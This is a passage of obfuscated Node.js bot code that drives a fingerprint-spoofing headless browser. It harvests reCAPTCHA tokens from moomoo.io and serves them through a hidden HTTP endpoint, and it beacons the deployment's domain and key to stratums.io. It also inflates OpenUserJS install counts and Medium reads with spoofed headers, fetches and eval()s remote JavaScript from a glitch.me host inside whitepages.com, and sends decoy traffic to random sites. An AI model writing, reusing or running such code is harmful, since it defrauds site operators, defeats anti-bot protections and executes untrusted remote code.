      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': Z(0xf) + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + X(0x6) + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': X(0x10) + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + Z(0x14) + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + X(0x5) + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + Y(0x2, 'ra[y') + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x1b76 + -0x985 * 0x1 + -0x11f1
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x1 * -0x132d + 0x65 * 0x2c + -0x3 * -0x9b)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x5 * 0x349 + 0x186f + 0x1 * -0x79e), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x16e2 + -0x124 * 0x1c + 0x3 * 0x326), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0xa * -0x399 + 0x4 * 0x21b + 0x1b8e;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x3 * 0xa71 + -0x2d * 0x93 + -0x57c * 0x1; w < getRandomInt(0xce * 0x1 + -0x2649 + 0x257c, 0xc6b + 0x373 * 0xb + -0x107 * 0x31); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x362b + 0x1801c + 0x1d21 * -0x7);
        }
      }();
    }, 0x41c + 0x2307 + -0x26bf), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0xf38 + -0x208e + 0x1156;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x10e7 + -0x1 * -0xe37 + 0x2b0, 0x6 * 0x3b7 + -0x503 * -0x1 + -0x909 * 0x3)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0x83 * 0xb9 + -0xa39a + 0x17775);
    }, 0x25d * 0xf + -0x20c1 + 0x1 * -0x24e), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x1d * 0x9 + 0x1b7 * -0xf + 0x1abe;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x15f4 + 0x25c7 * 0x1 + -0x3003), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x39c + -0x1 * -0x981 + -0xd1d), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x315 * 0x11 + 0x199c2c + -0xbac27);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x1 * -0x20e5 + 0x1385 + -0x3406);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0xef6 + 0x2248 + -0x3076);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x1f2b * 0x1 + -0xa47 + 0xaac);
}
doFlags['doOUJS'] && ((async () => {
  const a1 = d;
  async function f() {
    const a0 = d,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x9b9 + -0x192d + 0x6fb * 0x5) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x1d89 * 0x1 + 0x1 * -0x1f5a + 0x3ce4));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0xcbc + -0x1902 + 0x12df * 0x2, D['indexOf']('\x20'));
        return B ? E['slice'](-0x7bf * 0x1 + -0x251 * 0x3 + 0xd1 * 0x12, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x4844 + 0x4e00 + -0x6f34),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': a0(0x15),
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x17d * -0x18 + 0x1616 * 0x1 + 0x34b2),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y[a0(0x11)], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + a1(0x7) + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + a1(0x1a) + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + a1(0x17) + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x681 + -0x198a * 0x1 + 0x200b; k < -0x7f0 + -0x3f1 + -0x1 * -0xbe5; k++)
    setTimeout(f, (-0xb * -0x15d0 + 0x2ea3 * 0x1 + -0x3433) * k * getRandomInt(0x3a * -0x11 + -0x1 * 0x1b4b + 0x1f26, -0x2 * -0x568 + 0xec + -0xbb9));
  setInterval(() => {
    f();
    for (let l = 0x21d9 + 0xa81 * -0x2 + 0xcd7 * -0x1; l < 0x1 * 0x1da3 + -0x54 * 0x7 + -0x1 * 0x1b53; l++)
      setTimeout(f, (-0x11b04 + -0x699 * 0x43 + 0x3bf6f) * l * getRandomInt(0x9f + -0x86 * -0x2c + -0x17a6, -0x217 + -0x1863 * 0x1 + 0x1a7d));
  }, -0x520dea + 0x1b * 0x1a105 + 0x5d00e3);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const a2 = c,
    f = axios['create']({
      'headers': {
        'User-Agent': userAgents['random']()
      }
    });
  f['get'](miscSites[a2(0x1)](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x51 * 0x1b + -0x2baf + 0x3e7c) * getRandomInt(0x15 * -0x18a + -0x65 * -0x53 + -0x6c, 0x4e4 * -0x3 + -0x21bf + 0x3070));
}, 0x374 + 0x1 * -0xaab + 0x3b * 0x21);